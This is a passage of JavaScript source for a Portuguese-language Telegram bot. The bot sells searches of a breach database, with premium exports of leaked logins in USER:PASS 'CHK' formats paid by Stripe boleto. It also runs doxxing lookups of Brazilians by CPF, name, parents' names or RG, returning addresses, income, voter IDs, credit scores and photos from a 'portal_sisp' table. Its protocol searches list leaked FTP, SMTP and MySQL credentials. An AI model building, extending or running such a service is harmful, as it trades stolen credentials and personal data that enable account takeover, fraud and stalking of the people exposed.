          report += `\n🔑 *Senhas usadas (${senhas.length}):*\n`;
          senhas.slice(0, 10).forEach(s => { report += `• \`${s}\`\n`; });
          if (senhas.length > 10) report += `_...e mais ${senhas.length - 10}_\n`;

          if (fontes.length > 0) {
            report += `\n📁 *Fontes (${fontes.length}):*\n`;
            fontes.slice(0, 10).forEach(f => { report += `• \`${f}\`\n`; });
          }

          const cleanedRows = await getUniqueValidRows(rows, 'full', chatId);
          // Envia arquivo com todos os logins
          if (cleanedRows.length > 0) {
            const { content } = await formatRowsWithLimit(cleanedRows, 'full', chatId);
            await bot.sendDocument(chatId, Buffer.from(content, 'utf8'), opts({
              caption: report,
              parse_mode: 'Markdown'
            }), { filename: `WHOIS_${phone.replace(/\+/g, '')}.txt`, contentType: 'text/plain' });
          } else {
            await bot.sendMessage(chatId, report, opts({ parse_mode: 'Markdown' }));
          }
        } catch (err) {
          const msg = err.message?.includes('timeout') ? `⏱️ *Busca expirou!*` : `❌ Erro: ${err.message}`;
          bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
        }
        return;
      }

      // /geoip — Geolocalização de domínio/IP
      if (command === '/geoip') {
        if (!args || args.trim().length < 3) {
          pendingSearch.set(userKey, 'GEOIP');
          return bot.sendMessage(chatId, `📍 𝗕𝘂𝘀𝗰𝗮𝗿 𝗚𝗲𝗼𝗜𝗣\n\nEnvie o *IP* ou *Domínio* para geolocalizar:`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        const target = args.trim().replace(/^https?:\/\//i, '').replace(/^www\./i, '').split('/')[0];
        bot.sendChatAction(chatId, 'typing', opts()).catch(() => {});

        try {
          // Resolve DNS
          const dns = await import('dns');
          const { promisify } = await import('util');
          const resolve4 = promisify(dns.resolve4);

          let ip = target;
          let hostname = target;

          // Se não é IP, resolve DNS
          if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(target)) {
            try {
              const ips = await resolve4(target);
              ip = ips[0];
            } catch(e) {
              return bot.sendMessage(chatId, `❌ Não foi possível resolver DNS para \`${target}\``, opts({ parse_mode: 'Markdown' }));
            }
          } else {
            hostname = ip;
          }

          // Consulta API de geolocalização
          const ctrl = new AbortController();
          const t = setTimeout(() => ctrl.abort(), 5000);
          const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,hosting,query`, {
            signal: ctrl.signal
          });
          clearTimeout(t);
          const geo = await geoRes.json();

          if (geo.status !== 'primary') {
            return bot.sendMessage(chatId, `❌ Erro na geolocalização: ${geo.message || 'unknown'}`, opts({ parse_mode: 'Markdown' }));
          }

          const flag = geo.countryCode ? String.fromCodePoint(...[...geo.countryCode.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)) : '🌍';

          let report = `🌐 *GEOIP — Relatório OSINT*\n\n`;
          report += `🎯 *Alvo:* \`${hostname}\`\n`;
          report += `📡 *IP:* \`${geo.query}\`\n\n`;
          report += `${flag} *País:* ${geo.country} (${geo.countryCode})\n`;
          report += `📍 *Região:* ${geo.regionName} (${geo.region})\n`;
          report += `🏙️ *Cidade:* ${geo.city}\n`;
          report += `📮 *CEP:* ${geo.zip || 'N/A'}\n`;
          report += `📐 *Coordenadas:* \`${geo.lat}, ${geo.lon}\`\n`;
          report += `🕐 *Timezone:* ${geo.timezone}\n\n`;
          report += `🏢 *ISP:* ${geo.isp}\n`;
          report += `🏛️ *Organização:* ${geo.org}\n`;
          report += `🔢 *AS:* ${geo.as}\n`;
          report += `☁️ *Hosting/DC:* ${geo.hosting ? 'Sim' : 'Não'}\n`;

          if (hostname !== ip) {
            report += `\n🗺️ [Ver no Google Maps](https://www.google.com/maps?q=${geo.lat},${geo.lon})`;
          }

          await bot.sendMessage(chatId, report, opts({ parse_mode: 'Markdown', disable_web_page_preview: true }));

        } catch (err) {
          const msg = err.name === 'AbortError' ? `⏱️ *Timeout na consulta*` : `❌ Erro: ${err.message}`;
          bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
        }
        return;
      }

      // /consulta — Consultas Avançadas
      if (command === '/consulta' || command === '/consultar') {
        return showConsultaMenu(chatId, threadId);
      }

      // admins only

      // /copyurl — Baixa uma página web inteira como ZIP (igual saveweb2zip.com)
      if (command === '/copyurl' || command === '/copyweb' || command === '/saveweb') {
        if (!args || args.trim().length < 3) {
          pendingSearch.set(userKey, 'copyurl');
          return bot.sendMessage(chatId,
            `📦 𝗕𝗮𝗶𝘅𝗮𝗿 𝗣𝗮́𝗴𝗶𝗻𝗮 (𝗭𝗜𝗣)\n\nEnvie a *URL* (https://site.com):`,
            opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } })
          );
        }
        return performCopyUrl(chatId, args.trim(), threadId);
      }


      // /cancelar — sai do fluxo de buscas
      if (command === '/cancelar') {
        const userId = msg.from?.id;
        const userKey = `${chatId}_${userId}`;
        pendingBoleto.delete(chatId);
        pendingSearch.delete(chatId);
        pendingSearch.delete(userKey);
        pendingConsulta.delete(chatId);
        pendingConsulta.delete(userKey);
        return bot.sendMessage(chatId, `✅ *Cancelado*\n\nBuscas e ações pendentes foram canceladas. Use /start para voltar ao menu.`, opts({ parse_mode: 'Markdown' }));
      }

      // Comando desconhecido com /
      if (isCommand) {
        return bot.sendMessage(
          chatId,
          `❓ Comando desconhecido. Use /help para ver os comandos disponíveis.`,
          opts()
        );
      }

      // Verifica se está aguardando CPF para boleto
      const pending = pendingBoleto.get(chatId);
      if (pending) {
        const cpf = text.trim().replace(/\D/g, '');
        if (cpf.length === 11) {
          pendingBoleto.delete(chatId);
          try {
            const pm = await stripe.paymentMethods.create({
              type: 'boleto',
              billing_details: {
                name: msg.from?.first_name || 'Cliente',
                email: msg.from?.username ? `${msg.from.username}@telegram.com` : 'cliente@email.com',
                address: {
                  line1: 'Endereço do Cliente',
                  city: 'Sao Paulo',
                  state: 'SP',
                  postal_code: '00000000',
                  country: 'BR',
                },
              },
              boleto: { tax_id: cpf },
            });

            const pi = await stripe.paymentIntents.create({
              amount: pending.plan.priceCents,
              currency: 'brl',
              payment_method_types: ['boleto'],
              payment_method: pm.id,
              confirm: true,
              metadata: { chat_id: String(chatId), days: String(pending.plan.days) },
            });

            if (pi.next_action?.boleto_display_details) {
              const boleto = pi.next_action.boleto_display_details;
              await bot.sendMessage(chatId,
                `📄 *Boleto Gerado — ${pending.plan.emoji} ${pending.plan.label}*\n\n` +
                `📌 *Valor:* R$${(pending.plan.priceCents / 100).toFixed(0)}\n` +
                `⏳ *Dias:* ${pending.plan.days}\n\n` +
                `📋 *Linha Digitável:*\n\`${boleto.number}\`\n\n` +
                `🔗 *Link do Boleto:* ${boleto.hosted_voucher_url}\n` +
                `📎 *PDF Direto:* ${boleto.pdf}\n\n` +
                `📅 *Vence em:* ${new Date(boleto.expires_at * 1000).toLocaleDateString('pt-BR')}\n\n` +
                `_Após o pagamento, sua key será enviada automaticamente aqui!_`,
                opts({ parse_mode: 'Markdown' })
              );
            } else {
              bot.sendMessage(chatId, `❌ Erro ao gerar boleto. Tente novamente.`, opts());
            }
          } catch (err) {
            console.error('[BOLETO ERROR]', err.message);
            bot.sendMessage(chatId, `❌ Erro ao gerar boleto: ${err.message}`, opts());
          }
          return;
        } else {
          bot.sendMessage(chatId,
            `❌ CPF inválido! Digite apenas os 11 números.\n` +
            `Exemplo: \`00000000000\`\n\n` +
            `_Ou digite /cancelar para sair._`,
            opts({ parse_mode: 'Markdown' })
          );
          return;
        }
      }

      // Verifica se está aguardando valor para consulta externa
      const pendingConsultaKey = pendingConsulta.get(userKey) || pendingConsulta.get(chatId);
      if (pendingConsultaKey) {
        pendingConsulta.delete(userKey);
        pendingConsulta.delete(chatId);
        
        // Tratamento especial para puxar foto do Portal SISP
        if (pendingConsultaKey === 'foto') {
          const cpf = text.trim().replace(/\D/g, '').slice(-11);
          if (!cpf || cpf.length !== 11) {
            return bot.sendMessage(chatId, `❌ CPF inválido. Use formato: 12345678901`, opts());
          }
          
          bot.sendChatAction(chatId, 'upload_photo', opts()).catch(() => {});
          
          try {
            // Buscar no banco de dados portal_sisp_pessoas
            const result = await _writePool.query(
              `SELECT nome, cpf, email, telefone, foto_local, foto_url 
               FROM portal_sisp_pessoas 
               WHERE cpf = $1 
               LIMIT 1;`,
              [cpf]
            );
            
            if (!result.rows || result.rows.length === 0) {
              return bot.sendMessage(chatId, `❌ Nenhum registro encontrado para o CPF: \`${cpf}\``, opts({ parse_mode: 'Markdown' }));
            }
            
            const pessoa = result.rows[0];
            let caption = `👤 *${pessoa.nome || 'N/A'}*\n`;
            caption += `📋 CPF: \`${pessoa.cpf}\`\n`;
            if (pessoa.email) caption += `📧 Email: \`${pessoa.email}\`\n`;
            if (pessoa.telefone) caption += `📞 Telefone: \`${pessoa.telefone}\`\n`;
            
            // Se tem foto local, enviar
            if (pessoa.foto_local) {
              const fotoPath = path.join(__dirname, '..', 'portal_sisp_data', 'fotos', pessoa.foto_local);
              if (fs.existsSync(fotoPath)) {
                try {
                  const fileStream = fs.createReadStream(fotoPath);
                  await bot.sendPhoto(chatId, fileStream, { caption, parse_mode: 'Markdown', ...opts() });
                  return;
                } catch (e) {
                  console.error('Erro ao enviar foto:', e.message);
                }
              }
            }
            
            // Se não tem foto local, mostrar dados e URL da foto
            caption += `\n📸 *Foto:* `;
            if (pessoa.foto_url) {
              caption += `[Download](${pessoa.foto_url})`;
            } else {
              caption += 'Não disponível';
            }
            
            return bot.sendMessage(chatId, caption, opts({ parse_mode: 'Markdown' }));
            
          } catch (e) {
            console.error('Erro ao buscar foto:', e.message);
            return bot.sendMessage(chatId, `❌ Erro ao buscar foto: ${e.message}`, opts());
          }
        }
        
        // Tratamento original para outras consultas
        const api = CONSULTA_APIS[pendingConsultaKey];
        if (!api) return bot.sendMessage(chatId, `❌ API inválida.`, opts());
        const value = text.trim();
        if (!value || value.length < 2) return bot.sendMessage(chatId, `❌ Valor inválido.`, opts());
        bot.sendChatAction(chatId, 'typing', opts()).catch(() => {});
        const cacheKey = `${pendingConsultaKey}:${value}`;
        const cached = consultaCache[cacheKey];
        if (cached && Date.now() - cached.ts < 86400000) {
          await sendConsultaTxt(chatId, cached.data, api, '📦 CACHE', opts);
          return;
        }
        try {
          let data;
          if (api.local) {
            const baseUrl = process.env.BASE_URL || `https://breachdb-production-0da9.up.railway.app`;
            const ctrl = new AbortController();
            const t = setTimeout(() => ctrl.abort(), 20000);
            const localRes = await fetch(`${baseUrl}/api/consulta/${value}`, { signal: ctrl.signal });
            clearTimeout(t);
            const localData = await localRes.json();
            data = localData.dados || localData;
          } else {
            const ctrl = new AbortController();
            const t = setTimeout(() => ctrl.abort(), 15000);
            const res = await fetch(api.url + encodeURIComponent(value), { signal: ctrl.signal });
            clearTimeout(t);
            data = await res.json();
          }
          consultaCache[cacheKey] = { data, ts: Date.now() };
          saveConsultaCache();
          await sendConsultaTxt(chatId, data, api, '📡 ONLINE', opts);
        } catch (e) {
          const cached = consultaCache[cacheKey];
          if (cached) {
            await sendConsultaTxt(chatId, cached.data, api, '📦 OFFLINE CACHE', opts);
          } else {
            bot.sendMessage(chatId, `❌ API offline e sem cache: ${e.message}`, opts());
          }
        }
        return;
      }

      // Verifica se está aguardando valor para busca por botão
      const pendingField = pendingSearch.get(userKey) || pendingSearch.get(chatId);
      if (pendingField) {
        const searchValue = text.trim();
        if (searchValue.length < 1) {
          bot.sendMessage(chatId, `❌ Valor inválido. Digite um termo de busca válido.`, opts());
          return;
        }
        pendingSearch.delete(userKey);
        pendingSearch.delete(chatId);
        const fieldRoutes = {
          url: () => {
            const queryId = Date.now().toString(36) + Math.random().toString(36).substring(2, 5);
            queryStore.set(queryId, { query: searchValue, field: 'url', threadId });
            if (queryStore.size > 1000) { const firstKey = queryStore.keys().next().value; queryStore.delete(firstKey); }
            return bot.sendMessage(chatId, `🔍 *Busca URL:* \`${searchValue}\`\n\nEscolha o formato:`, opts({
              parse_mode: 'Markdown',
              reply_markup: { inline_keyboard: [[{ text: '📋 USER:PASS (PREMIUM)', callback_data: `chk_${queryId}` }, { text: '📋 URL:USER:PASS (PREMIUM)', callback_data: `chk2_${queryId}` }, { text: '📄 FULL', callback_data: `full_${queryId}` }, { text: '🌐 SUB', callback_data: `sub_${queryId}` }], [{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] }
            }));
          },
          email: () => sendResults(chatId, 'email', searchValue, pool, threadId),
          inurl: () => sendInurlResults(chatId, searchValue, pool, threadId),
          inmail: () => sendResults(chatId, 'email', `%${searchValue}%`, pool, threadId),
          user: () => sendUserResults(chatId, searchValue, pool, threadId),
          senha: () => sendResults(chatId, 'SENHA', searchValue, pool, threadId),
          telefone: () => sendResults(chatId, 'TELEFONE', searchValue, pool, threadId),
          ip: () => sendIpResults(chatId, searchValue, pool, threadId),
          cpf: () => sendCpfResults(chatId, searchValue, pool, threadId),
          cnpj: () => sendCnpjResults(chatId, searchValue, pool, threadId),
          domain: () => sendCheckDomainResults(chatId, searchValue, pool, threadId),
          subdominios: () => sendSubdomainResults(chatId, searchValue, pool, threadId),
          copyurl: () => performCopyUrl(chatId, searchValue, threadId),
          ftp: () => sendInurlResults(chatId, 'ftp://', pool, threadId),
          smtp: () => sendInurlResults(chatId, 'smtp', pool, threadId),
          mysql: () => sendInurlResults(chatId, ':3306', pool, threadId),
          port8080: () => sendInurlResults(chatId, ':8080', pool, threadId),
          port8443: () => sendInurlResults(chatId, ':8443', pool, threadId),
          whois: () => sendWhoisResults(chatId, searchValue, threadId),
          geoip: () => sendGeoIpResults(chatId, searchValue, threadId),
        };
        const handler = fieldRoutes[pendingField] || fieldRoutes.url;
        return handler();
      }

      // Mensagem sem comando — tenta ativar como key
      // Em grupos, NÃO tenta ativar key (silencia — evita "key inválida" no grupo)
      if (isGroup) return;
      // Limpa caracteres especiais que o Telegram pode adicionar (crases, asteriscos, etc.)
      let trimmed = text.trim().replace(/[`*_~[\]()>#+!]/g, '').toUpperCase();
      // Remove prefixos comuns que o usuário pode digitar por engano
      trimmed = trimmed.replace(/^(KEY|CHAVE|MINHA|CHAVE\s+KEY)\s+/i, '').trim();
      if (trimmed.length >= 10 && (trimmed.startsWith('ASLK') || trimmed.startsWith('AL'))) {
        console.log(`[BOT] Attempting key activation: ${chatId} => ${trimmed}`);
        const result = await activateKey(chatId, trimmed);
        if (result.success) {
          return bot.sendMessage(chatId, result.message, opts({ parse_mode: 'Markdown' }));
        } else {
          return bot.sendMessage(
            chatId,
            `❌ ${result.message}\n\n💬 *Planos Premium:* ${OWNER_PROFILE}`,
            opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '💬 SUPORTE', url: OWNER_PROFILE }], [{ text: '🏠 MENU PRINCIPAL', callback_data: 'back_start', style: 'primary' }]] } })
          );
        }
      }
      return;

    } catch (err) {
      console.error('💥 [BOT] Handler Error:', err);
    }
  });

  // ── Envia resultado de consulta como .txt (remove criador) ──
  function get(obj, ...keys) { for (const k of keys) { const v = obj[k]; if (v != null && v !== '') return v; } return ''; }
  function fmtTel(t) {
    const ddd = get(t, 'DDD', 'ddd');
    const num = get(t, 'TELEFONE', 'TELEFONE', 'numero', 'NUMERO');
    if (num) return `${ddd ? '('+ddd+') ' : ''}${num}`;
    return '';
  }
  function fmtEnd(e) {
    const rua = [get(e, 'LOGR_TIPO', 'logradouro'), get(e, 'LOGR_NOME', 'LOGRADOURO')].filter(Boolean).join(' ');
    const num = get(e, 'LOGR_NUMERO', 'numero', 'NUMERO');
    const bairro = get(e, 'BAIRRO', 'bairro');
    const cidade = get(e, 'CIDADE', 'cidade');
    const uf = get(e, 'UF', 'uf');
    const cep = get(e, 'CEP', 'cep');
    return [rua + (num ? ', '+num : ''), bairro, cidade + (uf ? '/'+uf : ''), cep].filter(Boolean).join(', ');
  }

  async function sendConsultaTxt(chatId, data, api, label, optsFn) {
    const results = data?.RESULTADOS || (data?.DADOS ? [data] : [data]);
    const lines = [];
    for (const item of results.slice(0, 5)) {
      const d = item?.DADOS || item;
      if (lines.length) lines.push('\n' + '─'.repeat(30));
      const n = get(d, 'NOME', 'nome');
      lines.push(`${n ? '👤 *' + n + '*' : '👤 *SEM NOME*'}`);
      lines.push('📌 *CPF:* `' + get(d, 'CPF', 'cpf') + '`');
      lines.push('⚤ *Sexo:* ' + get(d, 'SEXO', 'sexo'));
      lines.push('🎂 *Nasc:* ' + get(d, 'NASC', 'nascimento').substring(0,10));
      lines.push('👩 *Mãe:* ' + get(d, 'NOME_MAE', 'nome_mae'));
      lines.push('👨 *Pai:* ' + (get(d, 'NOME_PAI', 'nome_pai') || '—'));
      lines.push('🆔 *RG:* ' + get(d, 'RG', 'rg'));
      lines.push('🏛 *Orgão Emissor:* ' + get(d, 'ORGAO_EMISSOR', 'orgao_emissor') + (get(d, 'UF_EMISSAO', 'uf_emissao') ? '/' + get(d, 'UF_EMISSAO', 'uf_emissao') : ''));
      lines.push('🌍 *Nacionalidade:* ' + get(d, 'NACIONALID', 'nacionalidade'));
      lines.push('💍 *Est Civil:* ' + get(d, 'ESTCIV', 'estciv'));
      const cbo = get(d, 'CBO', 'cbo');
      const cboDesc = get(d, 'CBO_DESCRICAO', 'cbo_descricao');
      lines.push('💼 *Profissão:* ' + cbo + (cboDesc ? ' — ' + cboDesc : ''));
      lines.push('💰 *Renda:* R$' + get(d, 'RENDA', 'renda'));
      lines.push('📋 *Título Eleitor:* ' + get(d, 'TITULO_ELEITOR', 'titulo_eleitor'));
      lines.push('📌 *Sit Cad:* ' + get(d, 'CD_SIT_CAD', 'sit_cad'));
      lines.push('🔍 *Mosaic:* ' + get(d, 'CD_MOSAIC', 'mosaic'));
      lines.push('🆔 *Contato ID:* ' + get(d, 'CONTATOS_ID', 'contatos_id'));
      const dtob = get(d, 'DT_OB', 'data_obito');
      if (dtob) lines.push('💀 *Óbito:* ' + dtob.substring(0,10));
      lines.push('');

      const tels = item.TELEFONE || [];
      const fTels = tels.map(fmtTel).filter(Boolean);
      if (fTels.length) {
        lines.push('📞 *Telefones:*');
        for (const t of fTels.slice(0,5)) lines.push('  `' + t + '`');
        lines.push('');
      }
      const emails = item.EMAIL || [];
      const fEmails = emails.map(e => get(e, 'EMAIL', 'email', 'email')).filter(Boolean);
      if (fEmails.length) {
        lines.push('✉️ *Emails:*');
        for (const e of fEmails.slice(0,3)) lines.push('  `' + e + '`');
        lines.push('');
      }
      const ends = item.ENDERECOS || [];
      if (ends.length) {
        lines.push('📍 *Endereços:*');
        for (const e of ends.slice(0,3)) lines.push('  ' + fmtEnd(e));
        lines.push('');
      }
      const score = item.SCORE || [];
      if (score.length) {
        const s = score[0];
        const fScore = [get(s, 'CSB8_FAIXA', 'csb8_faixa', 'CSB8', 'csb8'), get(s, 'CSBA_FAIXA', 'csba_faixa', 'CSBA', 'csba')].filter(Boolean).join(' | ');
        if (fScore) lines.push('⭐ *Score:* ' + fScore);
      }
      for (const p of (item.PIS || [])) {
        const v = get(p, 'PIS', 'pis', 'numero', 'NUMERO');
        if (v) lines.push('🔢 *PIS:* `' + v + '`');
      }
    }
    if (results.length > 5) lines.push('\n_...e mais ' + (results.length - 5) + ' resultados_');
    if (!lines.length) return bot.sendMessage(chatId, '❌ Nenhum dado encontrado.', optsFn());
    const msg = lines.join('\n');
    if (msg.length > 4000) return bot.sendMessage(chatId, msg.substring(0, 3950) + '\n\n_...truncado_', optsFn({ parse_mode: 'Markdown', reply_markup: novaBtn }));
    return bot.sendMessage(chatId, msg, optsFn({ parse_mode: 'Markdown', reply_markup: novaBtn }));
  }

  // ── Menu de Consultas Externas ──
  async function showConsultaMenu(chatId, threadId) {
    const opts2 = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;
    return bot.sendMessage(chatId,
      `🔎 𝗖𝗼𝗻𝘀𝘂𝗹𝘁𝗮𝘀 𝗔𝘃𝗮𝗻𝗰̧𝗮𝗱𝗮𝘀 (𝗣𝗥𝗢)\n\nSelecione o tipo de consulta:`,
      opts2({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [
        [{ text: '🔢 CPF',     callback_data: 'consultar_cpf',     style: 'primary' }, { text: '👤 Nome', callback_data: 'consultar_nome', style: 'primary' }],
        [{ text: '👩 Nome da Mãe', callback_data: 'consultar_mae', style: 'primary' }, { text: '👨 Nome do Pai', callback_data: 'consultar_pai', style: 'primary' }],
        [{ text: '🆔 RG',  callback_data: 'consultar_rg',  style: 'primary' }, { text: '📞 Telefone', callback_data: 'consultar_tel', style: 'primary' }],
        [{ text: '✅ Situação CPF', callback_data: 'consultar_sit_cpf', style: 'primary' }, { text: '💼 Profissão', callback_data: 'consultar_cbo', style: 'primary' }],
        [{ text: '� Puxar Foto', callback_data: 'consultar_foto', style: 'primary' }],
        [{ text: '�🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
      ]}})
    );
  }

  bot.on('callback_query', async (callbackQuery) => {
    const data = callbackQuery.data;
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const threadId = msg.message_thread_id;
    const userId = callbackQuery.from.id;
    const userKey = `${chatId}_${userId}`;
    const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;
    const cbIsGroup = msg.chat && (msg.chat.type === 'group' || msg.chat.type === 'supergroup');

    // ── MODO GRUPO: todos do grupo podem usar ──
    if (cbIsGroup) {
      groupChats.add(chatId);
    }

    if (data.startsWith('chk_') || data.startsWith('chk2_') || data.startsWith('full_')) {
      const format = data.startsWith('chk2_') ? 'chk2' : data.split('_')[0];
      const queryId = data.substring(data.indexOf('_') + 1);
      const stored = queryStore.get(queryId);

      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});

      if (!stored) {
        return bot.sendMessage(chatId, '❌ Consulta expirada. Faça a busca novamente.');
      }

      if (format === 'chk' || format === 'chk2') {
        const access = await checkUserAccess(chatId, cbIsGroup);
        if (access.status !== 'premium') {
          return bot.sendMessage(chatId, '⚠️ Exportar nos formatos CHK e CHK2 é exclusivo para usuários *Premium*!', opts({ parse_mode: 'Markdown' }));
        }
      }

      return sendResults(chatId, stored.field, stored.query, pool, stored.threadId, format);
    }

    // Botão VOLTAR AO MENU PRINCIPAL
    if (data === 'cmd_menu') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      // Simula o comando /start novamente
      const mockUpdate = {
        message: { text: '/start', chat: msg.chat, from: callbackQuery.from }
      };
      bot.emit('text', mockUpdate);
      return;
    }

    // Botão LOGIN


// Botão FERRAMENTAS — Menu com apenas WHOIS e GEOIP
    if (data === 'tool_buscas') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      return bot.sendMessage(chatId,
        `🛠️ *FERRAMENTAS*\n\nSelecione uma opção:`,
        opts({
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🔍 WHOIS', callback_data: 'srch_whois', style: 'primary' }, { text: '📍 GEOIP', callback_data: 'srch_geoip', style: 'primary' }],
              [{ text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
            ]
          }
        })
      );
    }

    // Botão MENU DE BUSCA — Menu principal com módulos
    if (data === 'search_menu') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      return bot.sendMessage(chatId,
        `🔍 𝗠𝗢́𝗗𝗨𝗟𝗢𝗦 𝗗𝗘 𝗕𝗨𝗦𝗖𝗔\n\nEscolha uma categoria:`,
        opts({
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🔗 URLS', callback_data: 'mod_urls', style: 'primary' }],
              [{ text: '✉️ EMAILS', callback_data: 'mod_emails', style: 'primary' }],
              [{ text: '👤 USUÁRIOS', callback_data: 'mod_usuarios', style: 'primary' }],
              [{ text: '📞 TELEFONE', callback_data: 'mod_telefone', style: 'primary' }],
                                          [{ text: '🔌 PROTOCOLOS', callback_data: 'mod_protocolos', style: 'primary' }],
              [{ text: ' CONSULTAS AVANÇADAS', callback_data: 'puxar_dados', style: 'primary' }],
              [{ text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
            ]
          }
        })
      );
    }

    // ── MÓDULO URLS ──
    if (data === 'mod_urls') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      return bot.sendMessage(chatId,
        `🔗 𝗠𝗼́𝗗𝘂𝗟𝗢 𝗨𝗥𝗟𝗦\n\nEscolha a busca:`,
        opts({
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🔗 URL', callback_data: 'srch_url', style: 'primary' }],
              [{ text: '🔗 TERMO NA URL', callback_data: 'srch_inurl', style: 'primary' }],
              [{ text: '◀️ VOLTAR', callback_data: 'search_menu', style: 'primary' }, { text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
            ]
          }
        })
      );
    }

    // ── MÓDULO EMAILS ──
    if (data === 'mod_emails') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      return bot.sendMessage(chatId,
        `✉️ 𝗠𝗼́𝗗𝘂𝗟𝗢 𝗘𝗠𝗔𝗜𝗟𝗦\n\nEscolha a busca:`,
        opts({
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '✉️ E-MAIL', callback_data: 'srch_email', style: 'primary' }],
              [{ text: '📨 PROVEDOR', callback_data: 'srch_inmail', style: 'primary' }],
              [{ text: '◀️ VOLTAR', callback_data: 'search_menu', style: 'primary' }, { text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
            ]
          }
        })
      );
    }

    // ── MÓDULO USUÁRIOS ──
    if (data === 'mod_usuarios') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      return bot.sendMessage(chatId,
        `👤 𝗠𝗼́𝗗𝘂𝗟𝗢 𝗨𝗦𝗨𝗔́𝗥𝗜𝗢𝗦\n\nEscolha a busca:`,
        opts({
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '👤 USUÁRIO', callback_data: 'srch_user', style: 'primary' }],
              [{ text: '🔒 SENHA', callback_data: 'srch_senha', style: 'primary' }],
              [{ text: '◀️ VOLTAR', callback_data: 'search_menu', style: 'primary' }, { text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
            ]
          }
        })
      );
    }

    // ── MÓDULO TELEFONE ──
    if (data === 'mod_telefone') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      return bot.sendMessage(chatId,
        `📞 𝗠𝗼́𝗗𝘂𝗟𝗢 𝗧𝗘𝗟𝗘𝗙𝗢𝗡𝗘\n\nEscolha a busca:`,
        opts({
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '📞 TELEFONE', callback_data: 'srch_telefone', style: 'primary' }],
              [{ text: '📍 IP', callback_data: 'srch_ip', style: 'primary' }],
              [{ text: '◀️ VOLTAR', callback_data: 'search_menu', style: 'primary' }, { text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
            ]
          }
        })
      );
    }

    // ── MÓDULO DADOS ──
    if (data === 'mod_dados') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      return bot.sendMessage(chatId,
        `📋 𝗠𝗢́𝗗𝘂𝗟𝗢 𝗗𝗔𝗗𝗢𝗦\n\nEscolha a busca:`,
        opts({
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '📋 CPF', callback_data: 'srch_cpf', style: 'primary' }],
              [{ text: '🏢 CNPJ', callback_data: 'srch_cnpj', style: 'primary' }],
              [{ text: '◀️ VOLTAR', callback_data: 'search_menu', style: 'primary' }, { text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
            ]
          }
        })
      );
    }

    // ── MÓDULO DOMÍNIOS ──
    if (data === 'mod_dominios') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      return bot.sendMessage(chatId,
        `🌍 𝗠𝗢́𝗗𝘂𝗟𝗢 𝗗𝗢𝗠𝗜𝗡𝗜𝗢𝗦\n\nEscolha a busca:`,
        opts({
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🌍 DOMÍNIO', callback_data: 'srch_domain', style: 'primary' }],
